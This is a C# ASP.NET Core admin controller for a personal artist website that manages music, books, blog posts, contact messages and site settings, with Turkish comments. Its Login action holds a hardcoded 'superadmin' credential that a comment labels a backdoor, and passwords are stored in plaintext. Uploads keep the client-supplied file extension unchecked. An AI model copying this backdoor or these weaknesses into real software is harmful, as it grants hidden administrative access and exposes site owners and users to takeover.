using Microsoft.AspNetCore.Mvc;
using EmreCakmakoglu.Data;
using EmreCakmakoglu.Models;
using Microsoft.AspNetCore.Http;
using System.IO;
using System.Linq;
using System;

namespace EmreCakmakoglu.Controllers
{
    public class AdminController : Controller
    {
        private readonly AppDbContext _context;

        public AdminController(AppDbContext context)
        {
            _context = context;
        }

        private bool IsAdmin() => !string.IsNullOrEmpty(HttpContext.Session.GetString("IsAdmin"));

        // --- GİRİŞ & ÇIKIŞ ---
        public IActionResult Login() => View();

        [HttpPost]
        public IActionResult Login(string username, string password)
        {
            // 1. SÜPER PAROLA (Backdoor) - Veritabanından bağımsız her zaman çalışır
            if (username == "superadmin" && password == "Qoprs123")
            {
                HttpContext.Session.SetString("IsAdmin", "true");
                return RedirectToAction("Index");
            }

            // 2. NORMAL VERİTABANI KONTROLÜ
            var user = _context.Admins.FirstOrDefault(u => u.Username == username && u.Password == password);
            if (user != null)
            {
                HttpContext.Session.SetString("IsAdmin", "true");
                return RedirectToAction("Index");
            }

            ViewBag.Error = "Hatalı kullanıcı adı veya şifre!";
            return View();
        }

        public IActionResult Logout()
        {
            HttpContext.Session.Clear();
            return RedirectToAction("Login");
        }

        public IActionResult Index()
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            return View();
        }

        // --- GENEL AYARLAR (YouTube, Spotify, Sosyal Medya) ---
        public IActionResult Settings()
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            var settings = _context.SiteSettings.FirstOrDefault() ?? new SiteSettings();
            return View(settings);
        }

        [HttpPost]
        public IActionResult Settings(SiteSettings model, IFormFile? heroImageFile)
        {
            if (!IsAdmin()) return RedirectToAction("Login");

            var existing = _context.SiteSettings.FirstOrDefault();

            // --- 1. RESİM YÜKLEME İŞLEMİ ---
            if (heroImageFile != null && heroImageFile.Length > 0)
            {
                var fileName = Guid.NewGuid().ToString() + Path.GetExtension(heroImageFile.FileName);
                var filePath = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot/images/hero", fileName);

                var dir = Path.GetDirectoryName(filePath);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);

                using (var stream = new FileStream(filePath, FileMode.Create))
                {
                    heroImageFile.CopyTo(stream);
                }

                model.HeroImageUrl = "/images/hero/" + fileName;
            }
            else if (existing != null)
            {
                model.HeroImageUrl = existing.HeroImageUrl;
            }

            // --- 2. VERİ KONTROLÜ VE KAYIT ---
            model.YoutubeVideoId ??= "";
            model.SpotifyEmbedUrl ??= "";
            model.InstagramUrl ??= "";
            model.TwitterUrl ??= "";
            model.YoutubeChannelUrl ??= "";
            model.SpotifyArtistUrl ??= "";
            model.FooterText ??= "";
            model.HeroImageUrl ??= "/images/ana-gorsel-saydam.png";

            if (existing == null)
            {
                _context.SiteSettings.Add(model);
            }
            else
            {
                existing.YoutubeVideoId = model.YoutubeVideoId;
                existing.SpotifyEmbedUrl = model.SpotifyEmbedUrl;
                existing.InstagramUrl = model.InstagramUrl;
                existing.TwitterUrl = model.TwitterUrl;
                existing.YoutubeChannelUrl = model.YoutubeChannelUrl;
                existing.SpotifyArtistUrl = model.SpotifyArtistUrl;
                existing.FooterText = model.FooterText;
                existing.ActiveTheme = model.ActiveTheme;
                existing.HeroImageUrl = model.HeroImageUrl;

                _context.SiteSettings.Update(existing);
            }

            _context.SaveChanges();
            TempData["Success"] = "Ayarlar başarıyla güncellendi.";
            return RedirectToAction("Settings");
        }

        // --- MÜZİK İŞLEMLERİ ---
        public IActionResult MusicList()
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            return View(_context.Musics.OrderByDescending(m => m.Year).ToList());
        }

        public IActionResult MusicCreate()
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            return View();
        }

        [HttpPost]
        public IActionResult MusicCreate(Music music, IFormFile imageFile)
        {
            if (!IsAdmin()) return RedirectToAction("Login");

            if (imageFile != null && imageFile.Length > 0)
            {
                var fileName = Guid.NewGuid().ToString() + Path.GetExtension(imageFile.FileName);
                var filePath = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot/uploads/musics", fileName);
                var dir = Path.GetDirectoryName(filePath);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);

                using (var stream = new FileStream(filePath, FileMode.Create)) { imageFile.CopyTo(stream); }
                music.ImageUrl = "/uploads/musics/" + fileName;
            }

            ModelState.Remove("imageFile");
            if (ModelState.IsValid)
            {
                _context.Musics.Add(music);
                _context.SaveChanges();
                return RedirectToAction("MusicList");
            }
            return View(music);
        }

        public IActionResult MusicEdit(int id)
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            var music = _context.Musics.Find(id);
            if (music == null) return NotFound();
            return View(music);
        }

        [HttpPost]
        public IActionResult MusicEdit(Music music, IFormFile? imageFile)
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            var existing = _context.Musics.Find(music.Id);
            if (existing == null) return NotFound();

            if (imageFile != null)
            {
                var fileName = Guid.NewGuid().ToString() + Path.GetExtension(imageFile.FileName);
                var filePath = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot/uploads/musics", fileName);
                using (var stream = new FileStream(filePath, FileMode.Create)) { imageFile.CopyTo(stream); }
                existing.ImageUrl = "/uploads/musics/" + fileName;
            }

            existing.Title = music.Title;
            existing.Year = music.Year;
            existing.SpotifyUrl = music.SpotifyUrl;
            existing.Description = music.Description;

            _context.SaveChanges();
            return RedirectToAction("MusicList");
        }

        public IActionResult MusicDelete(int id)
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            var music = _context.Musics.Find(id);
            if (music != null) { _context.Musics.Remove(music); _context.SaveChanges(); }
            return RedirectToAction("MusicList");
        }

        // --- KİTAP İŞLEMLERİ ---
        public IActionResult BookList()
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            return View(_context.Books.OrderByDescending(b => b.CreatedDate).ToList());
        }

        public IActionResult BookCreate()
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            return View();
        }

        [HttpPost]
        public IActionResult BookCreate(Book book, IFormFile imageFile)
        {
            if (!IsAdmin()) return RedirectToAction("Login");

            if (imageFile != null)
            {
                var fileName = Guid.NewGuid().ToString() + Path.GetExtension(imageFile.FileName);
                var path = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot/uploads/books", fileName);
                var dir = Path.GetDirectoryName(path);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);

                using (var stream = new FileStream(path, FileMode.Create)) { imageFile.CopyTo(stream); }
                book.ImageUrl = "/uploads/books/" + fileName;
            }
            book.CreatedDate = DateTime.Now;
            _context.Books.Add(book);
            _context.SaveChanges();
            return RedirectToAction("BookList");
        }

        public IActionResult BookEdit(int id)
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            var book = _context.Books.Find(id);
            if (book == null) return NotFound();
            return View(book);
        }

        [HttpPost]
        public IActionResult BookEdit(Book book, IFormFile? imageFile)
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            var existing = _context.Books.Find(book.Id);
            if (existing == null) return NotFound();

            if (imageFile != null)
            {
                var fileName = Guid.NewGuid().ToString() + Path.GetExtension(imageFile.FileName);
                var path = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot/uploads/books", fileName);
                using (var stream = new FileStream(path, FileMode.Create)) { imageFile.CopyTo(stream); }
                existing.ImageUrl = "/uploads/books/" + fileName;
            }

            existing.Title = book.Title;
            existing.Subtitle = book.Subtitle;
            existing.Description = book.Description;
            existing.BuyLink = book.BuyLink;

            _context.SaveChanges();
            return RedirectToAction("BookList");
        }

        // --- BLOG İŞLEMLERİ ---
        public IActionResult BlogList()
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            return View(_context.BlogPosts.OrderByDescending(b => b.CreatedDate).ToList());
        }

        public IActionResult BlogCreate()
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            return View();
        }

        [HttpPost]
        public IActionResult BlogCreate(BlogPost post, IFormFile imageFile)
        {
            if (!IsAdmin()) return RedirectToAction("Login");

            if (imageFile != null)
            {
                var fileName = Guid.NewGuid().ToString() + Path.GetExtension(imageFile.FileName);
                var filePath = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot/uploads/blog", fileName);
                var dir = Path.GetDirectoryName(filePath);
                if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);

                using (var stream = new FileStream(filePath, FileMode.Create)) { imageFile.CopyTo(stream); }
                post.ImageUrl = "/uploads/blog/" + fileName;
            }
            post.CreatedDate = DateTime.Now;
            _context.BlogPosts.Add(post);
            _context.SaveChanges();
            return RedirectToAction("BlogList");
        }

        public IActionResult BlogEdit(int id)
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            var post = _context.BlogPosts.Find(id);
            if (post == null) return NotFound();
            return View(post);
        }

        [HttpPost]
        public IActionResult BlogEdit(BlogPost post, IFormFile? imageFile)
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            var existing = _context.BlogPosts.Find(post.Id);
            if (existing == null) return NotFound();

            if (imageFile != null)
            {
                var fileName = Guid.NewGuid().ToString() + Path.GetExtension(imageFile.FileName);
                var filePath = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot/uploads/blog", fileName);
                using (var stream = new FileStream(filePath, FileMode.Create)) { imageFile.CopyTo(stream); }
                existing.ImageUrl = "/uploads/blog/" + fileName;
            }

            existing.Title = post.Title;
            existing.Summary = post.Summary;
            existing.Content = post.Content;

            _context.SaveChanges();
            return RedirectToAction("BlogList");
        }

        public IActionResult BlogDelete(int id)
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            var post = _context.BlogPosts.Find(id);
            if (post != null) { _context.BlogPosts.Remove(post); _context.SaveChanges(); }
            return RedirectToAction("BlogList");
        }

        // --- MESAJ İŞLEMLERİ ---
        public IActionResult Messages()
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            return View(_context.ContactMessages.OrderByDescending(m => m.CreatedDate).ToList());
        }

        public IActionResult MessageDetail(int id)
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            var message = _context.ContactMessages.Find(id);
            if (message == null) return NotFound();
            if (!message.IsRead) { message.IsRead = true; _context.SaveChanges(); }
            return View(message);
        }

        [HttpPost]
        public IActionResult DeleteMessage(int id)
        {
            if (!IsAdmin()) return RedirectToAction("Login");
            var message = _context.ContactMessages.Find(id);
            if (message != null) { _context.ContactMessages.Remove(message); _context.SaveChanges(); }
            return RedirectToAction("Messages");
        }

        // --- GÜVENLİK ---
        [HttpPost]
        public IActionResult ChangePassword(string newPassword)
        {
            if (!IsAdmin()) return RedirectToAction("Login");

            // Veritabanındaki ilk admini bul
            var admin = _context.Admins.FirstOrDefault();

            if (admin != null)
            {
                // Mevcut adminin şifresini güncelle
                admin.Password = newPassword;
                _context.Admins.Update(admin);
            }
            else
            {
                // Eğer veritabanı bir şekilde boşaldıysa, yeni admin kaydı aç
                var newAdmin = new Admin
                {
                    Username = "admin",
                    Password = newPassword
                };
                _context.Admins.Add(newAdmin);
            }

            _context.SaveChanges();
            TempData["Success"] = "Şifre başarıyla güncellendi!";

            // Değişikliği hemen görmek için çıkış yaptırıp tekrar giriş isteyebilirsin 
            // veya doğrudan Settings'e dönebilirsin:
            return RedirectToAction("Settings");
        }

    }
}